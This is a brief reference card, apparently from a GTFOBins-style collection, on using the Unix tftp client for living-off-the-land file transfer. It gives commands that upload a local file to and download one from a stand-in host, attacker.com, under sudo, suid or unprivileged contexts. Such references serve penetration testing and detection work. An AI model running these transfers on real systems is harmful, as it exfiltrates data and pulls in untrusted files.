---
type: gtfobin
name: tftp
platform: Unix
functions: [download, upload]
tags: [gtfobin, unix, lotl]
---

# tftp

## download

```bash
tftp attacker.com
get /path/to/input-file
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
tftp attacker.com
put /path/to/input-file
```
**Contexts:** sudo, suid, unprivileged
